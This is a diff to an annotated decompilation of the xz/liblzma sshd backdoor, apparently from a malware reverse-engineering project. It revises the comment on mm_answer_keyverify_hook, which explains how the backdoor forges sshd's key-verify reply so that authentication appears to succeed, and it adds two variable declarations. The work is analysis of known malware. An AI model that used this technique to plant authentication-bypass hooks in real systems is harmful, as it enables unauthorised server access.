@@ -5,7 +5,11 @@
 
 
 /*
- * AutoDoc: Intercepts the monitor key-verify request and writes the prebuilt response stored in the global context directly to the socket, skipping sshd's verification logic. It is paired with the keyallowed hook so the forged monitor exchange looks legitimate while the backdoor takes over.
+ * AutoDoc: Uses the cached monitor payload context to send the prebuilt MONITOR_ANS_KEYVERIFY reply
+ * directly to the requesting socket. After the write it restores the original
+ * mm_answer_keyverify function pointer so sshd's dispatcher advances as if the verifier
+ * succeeded, and if the write fails it terminates sshd via the libc exit import to avoid leaving
+ * a half-patched state.
  */
 #include "xzre_types.h"
 
@@ -16,6 +20,8 @@ int mm_answer_keyverify_hook(ssh *ssh,int sock,sshbuf *m)
   libc_imports_t *funcs;
   long lVar1;
   ssize_t sVar2;
+  sshd_payload_ctx_t *payload_ctx;
+  libc_imports_t *libc_imports;
   
   if (global_ctx == 0) {
     return 0;
